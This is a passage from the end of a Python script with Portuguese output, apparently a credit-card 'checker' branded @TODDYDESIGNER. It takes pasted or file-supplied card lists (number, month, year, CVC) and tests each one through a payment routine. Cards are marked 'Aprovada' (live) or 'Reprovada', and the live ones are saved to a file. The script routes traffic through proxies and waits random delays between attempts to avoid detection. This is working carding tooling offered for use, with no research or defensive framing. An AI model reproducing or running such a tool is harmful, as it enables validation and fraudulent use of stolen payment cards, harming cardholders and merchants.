            return "LIVE", card_fmt, clean, tempo()
        dbg(f"[{idx}] iniciarPagamento ok false msg={clean}")
        return "DIE", card_fmt, clean or "Pagamento recusado", tempo()

def main():
    banner()
    proxy_menu()
    # input area
    print(f"{D}  ──────────────────────────────────────────────{W}")
    print(f"{BW_BOLD}  Envie os cartões para checagem{W}")
    print(f"{D}  ──────────────────────────────────────────────{W}")
    print(f"{BW}Formato:{W} {D}numero|mes|ano|cvc{W}")
    print(f"{BW}Exemplo:{W} {D}0000000000000000|00|0000|000{W}")
    print(f"{DIM}Cole a lista e pressione Enter duas vezes para processar:{W}\n")

    lines = []
    if len(sys.argv) > 1:
        try:
            with open(sys.argv[1], 'r', encoding='utf-8') as f:
                lines = [l.strip() for l in f if l.strip()]
        except OSError as e:
            dbg(f"Erro abrir arquivo {sys.argv[1]}: {e}")
            print(f"Erro ao abrir arquivo: {e}")
            return
    else:
        while True:
            try:
                line = input()
                if not line:
                    break
                lines.append(line.strip())
            except EOFError:
                break

    if not lines:
        print("Nenhum cartão fornecido.")
        return

    print(f"\n[+] Processando {len(lines)} cartões...\n")
    try:
        open(DEBUG_FILE, "w", encoding="utf-8").write(f"=== debug {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except: pass
    Path(LIVES_FILE).touch(exist_ok=True)
    Path(DIES_FILE).touch(exist_ok=True)

    lives = 0
    dies = 0
    try:
        for idx, raw in enumerate(lines, 1):
            parsed = parse_card(raw)
            if not parsed:
                # formato inválido já no padrão pedido
                display = raw.strip()
                msg = "Formato inválido. Use numero|mes|ano|cvc"
                # bubble for invalid
                bubble_inv = f"{BG_RED}{BW_BOLD}  ❌ Reprovada  {W}"
                arrow = f"{D} ➔ {W}"
                toddy = f"{BW_BOLD}@TODDYDESIGNER{W}"
                card_w = f"{BW}{display}{W}"
                msg_c = f"{R}{msg}{W}"
                preco_w = f"{BW}{_get_ultimo_preco_str()}{W}"
                print(f"{bubble_inv} {arrow}{card_w}{arrow}{msg_c}{arrow}{D}TEMPO 0.0s{W}{arrow}{preco_w}{arrow}{toddy}")
                out = f"{display} | [{msg}] | {_get_ultimo_preco_str()} | @TODDYDESIGNER" 
                dbg(f"[{idx}] formato inválido raw={raw}")
                try:
                    with open(DIES_FILE, "a", encoding="utf-8") as f:
                        f.write(f"DIE - {out}\n")
                except: pass
                dies += 1
                continue
            card_fmt, _ = parsed
            try:
                status, card_out, msg, t = process_card(card_fmt, idx, len(lines))
            except Exception as e:
                import traceback
                dbg(f"[{idx}] EXCEPTION geral {e}\n{traceback.format_exc()}")
                status, card_out, msg, t = "DIE", card_fmt, f"Exception: {e}", "0.0s"

            # normaliza msg para padrão [msg]
            msg_clean = re.sub(r'\s+', ' ', str(msg)).strip()
            if len(msg_clean) > 400:
                msg_clean = msg_clean[:400] + "..."
            # remove colchetes duplicados
            if msg_clean.startswith("[") and msg_clean.endswith("]"):
                msg_inner = msg_clean[1:-1]
            else:
                msg_inner = msg_clean

            preco_str = _get_ultimo_preco_str()
            # bubble + card white + retorno colored + tempo + preco + @toddydesigner
            arrow = f"{D} ➔ {W}"
            tempo_str = f"{D}TEMPO {t}{W}"
            toddy = f"{BW_BOLD}@TODDYDESIGNER{W}"
            card_w = f"{BW}{card_out}{W}"
            preco_w = f"{BW}{preco_str}{W}"
            if status == "LIVE":
                bubble = f"{BG_GREEN}{BW_BOLD}  ✅ Aprovada  {W}"
                msg_c = f"{G}{msg_inner}{W}"
                out = f"{card_out} | [{msg_inner}] | {preco_str} | @TODDYDESIGNER"
                print(f"{bubble} {arrow}{card_w}{arrow}{msg_c}{arrow}{tempo_str}{arrow}{preco_w}{arrow}{toddy}")
                try:
                    with open(LIVES_FILE, "a", encoding="utf-8") as f:
                        f.write(f"✅ Aprovada ➔ {out}\n")
                except: pass
                lives += 1
            else:
                bubble = f"{BG_RED}{BW_BOLD}  ❌ Reprovada  {W}"
                msg_c = f"{R}{msg_inner}{W}"
                out = f"{card_out} | [{msg_inner}] | {preco_str} | @TODDYDESIGNER"
                print(f"{bubble} {arrow}{card_w}{arrow}{msg_c}{arrow}{tempo_str}{arrow}{preco_w}{arrow}{toddy}")
                # debug já logado
                if DEBUG:
                    print(f"{D}  └─ debug: {msg_inner[:120]}{W}")
                try:
                    with open(DIES_FILE, "a", encoding="utf-8") as f:
                        f.write(f"DIE - {out}\n")
                except: pass
                dies += 1

            if idx < len(lines):
                # delay pequeno para não floodar
                try:
                    time.sleep(random.uniform(1.2, 2.2))
                except KeyboardInterrupt:
                    raise KeyboardInterrupt

    except KeyboardInterrupt:
        print(f"\n\n{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f"{Y}{B}  ⚠  TESTE INTERROMPIDO PELO USUÁRIO  {W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f"  {W}Processados até agora: {B}{idx if 'idx' in locals() else 0}/{len(lines)}{W}  |  {G}LIVE {lives}{W}  |  {R}DIE {dies}{W}")
        print(f"  {D}Lives salvas em: {LIVES_FILE}{W}")
        print(f"  {D}Debug em: {DEBUG_FILE}{W}")
        print(f"  {C}Volta quando quiser, {B}@toddydesigner{W}{C} te espera! 💚{W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")
        try:
            dbg(f"INTERROMPIDO pelo usuário em {idx}/{len(lines)} lives={lives} dies={dies}")
        except: pass
        sys.exit(130)

    print(f"\n{D}  ──────────────────────────────────────────────{W}")
    print(f"{BW_BOLD}  Finalizado: {len(lines)} processados {W}| {BG_GREEN}{BW_BOLD} LIVE {lives} {W} | {BG_RED}{BW_BOLD} DIE {dies} {W}")
    print(f"{D}  Lives salvas em: {BW}{LIVES_FILE}{W}")
    if DEBUG:
        print(f"{D}  Debug em: {DEBUG_FILE}{W}")
    print(f"{D}  ──────────────────────────────────────────────{W}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f"{Y}{B}  ⚠  TESTE INTERROMPIDO PELO USUÁRIO  {W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
        print(f"  {W}Interrompido antes de iniciar. Até a próxima, {B}@toddydesigner{W}{C}! 💚{W}")
        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")
        sys.exit(130)
